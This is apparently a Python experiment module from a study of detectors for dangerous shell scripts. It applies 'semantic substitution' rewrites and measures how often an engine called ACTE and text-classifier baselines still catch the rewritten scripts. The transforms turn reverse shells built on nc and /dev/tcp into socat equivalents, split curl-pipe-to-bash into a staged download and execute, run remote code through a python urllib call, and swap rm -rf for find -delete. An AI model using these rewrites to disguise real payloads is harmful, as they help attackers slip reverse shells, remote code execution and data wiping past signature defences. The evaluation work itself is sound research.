"""RQ6b — systematic semantic-substitution attacks with an attacker budget.

RQ6 showed that *additive* benign camouflage does not fool ACTE. The attacks that
actually work (the RQ4 misses) are *semantic substitutions*: swap a signature-
matched construct for a behaviour-equivalent one the signature base does not
cover. This module builds those attacks systematically, applies them against
ACTE and every learned baseline, and reports evasion as a function of the
attacker's budget (how many substitutions they are willing to make).

Each transform preserves the malicious effect (a reverse shell is still a reverse
shell, a wipe is still a wipe) while removing a specific lexical/signature marker.
This is the problem-space analogue of a feature-space attack: the attacker edits
the artefact, not the feature vector, and the edit stays semantically valid.
"""

from __future__ import annotations

import re
from typing import Callable, Dict, List

from acte.feedback import FeedbackLearning
from acte.pipeline import ACTEPipeline
from acte.trust_engine import TrustEvaluationEngine
from experiments.acte_eval import compute_features
from experiments.dataset import Sample
from experiments.ml_baselines import _models, _vectorizer
from sklearn.pipeline import Pipeline


# --- semantic-preserving substitutions (each returns possibly-unchanged text) ---
def t_rm_to_find(s: str) -> str:
    # rm -rf <target>  ->  find <target> -delete  (behaviour-equivalent deletion)
    return re.sub(r"\brm\s+-[a-zA-Z]*r[a-zA-Z]*f?[a-zA-Z]*\s+(\S+)",
                  r"find \1 -mindepth 0 -delete", s)


def t_nc_to_socat(s: str) -> str:
    # nc -e /bin/sh HOST PORT  ->  socat TCP:HOST:PORT EXEC:/bin/sh
    return re.sub(r"\bnc(?:at)?\s+-e\s+(/bin/(?:ba)?sh)\s+(\S+)\s+(\S+)",
                  r"socat TCP:\2:\3 EXEC:\1", s)


def t_devtcp_to_socat(s: str) -> str:
    # bash -i >& /dev/tcp/HOST/PORT 0>&1  ->  socat exec
    return re.sub(r"(?:ba)?sh\s+-i\s*>&?\s*/dev/tcp/([0-9a-zA-Z.\-]+)/([0-9]+)\s*0>&1",
                  r"socat TCP:\1:\2 EXEC:'/bin/bash -li',pty,stderr", s)


def t_curlpipe_to_staged(s: str) -> str:
    # curl URL | [sudo] bash  ->  staged download + chmod + exec (splits the pipeline)
    return re.sub(r"\b(curl|wget)\b([^\n|]*?)\|\s*(sudo\s+)?(?:ba)?sh\b",
                  r"\1\2-o /tmp/.stage; chmod +x /tmp/.stage; \3/tmp/.stage", s)


def t_base64_indirection(s: str) -> str:
    # wrap a curl|bash-less remote fetch via python exec (tool substitution)
    return re.sub(r"\bcurl\s+-fsSL\s+(\S+)",
                  r"python3 -c \"import urllib.request,os;os.system(urllib.request.urlopen('\1').read().decode())\"", s)


TRANSFORMS: List[tuple] = [
    ("rm_to_find", t_rm_to_find),
    ("nc_to_socat", t_nc_to_socat),
    ("devtcp_to_socat", t_devtcp_to_socat),
    ("curlpipe_to_staged", t_curlpipe_to_staged),
    ("curl_to_python", t_base64_indirection),
]


def _apply_all(s: str) -> str:
    for _name, fn in TRANSFORMS:
        s = fn(s)
    return s


def _recall(pred: List[int]) -> float:
    return sum(pred) / len(pred) if pred else 0.0


def evaluate_adversarial_budget(
    train: List[Sample], test: List[Sample], epochs: int = 40, seed: int = 1337
) -> Dict:
    dangerous = [s for s in test if s.label == 1]
    originals = [s.script for s in dangerous]

    # ACTE
    engine = TrustEvaluationEngine()
    tf = compute_features(train)
    learner = FeedbackLearning(engine, learning_rate=0.3, l2=1e-3, seed=seed)
    learner.train(list(zip(tf, [s.label for s in train])), epochs=epochs)
    trs = [engine.evaluate_features(f).risk_score for f in tf]
    learner.tune_threshold(list(zip(trs, [s.label for s in train])), target="f1")
    thr = engine.decision_threshold
    acte_pipe = ACTEPipeline(engine=engine)

    def acte_pred(scripts):
        return [1 if acte_pipe.analyze(x, generate_policy=False).assessment.risk_score >= thr
                else 0 for x in scripts]

    # learned baselines
    detectors = {"ACTE": acte_pred}
    for bname in ("TF-IDF + LogReg", "TF-IDF + LinearSVM", "TF-IDF + RandomForest"):
        pipe = Pipeline([("tfidf", _vectorizer()), ("clf", _models(seed)[bname])])
        pipe.fit([s.script for s in train], [s.label for s in train])
        detectors[bname] = (lambda p: (lambda scripts: p.predict(scripts).tolist()))(pipe)

    results: Dict[str, Dict] = {"n_dangerous": len(dangerous), "detectors": {}}
    for dname, fn in detectors.items():
        row = {"original_recall": _recall(fn(originals)), "per_attack": {}}
        # budget = 1: each single transform
        for tname, tfn in TRANSFORMS:
            mutated = [tfn(x) for x in originals]
            row["per_attack"][tname] = _recall(fn(mutated))
        # budget = max: all transforms chained (strongest attacker)
        row["all_transforms"] = _recall(fn([_apply_all(x) for x in originals]))
        row["evasion_at_max_budget"] = round(row["original_recall"] - row["all_transforms"], 3)
        results["detectors"][dname] = row
    return results
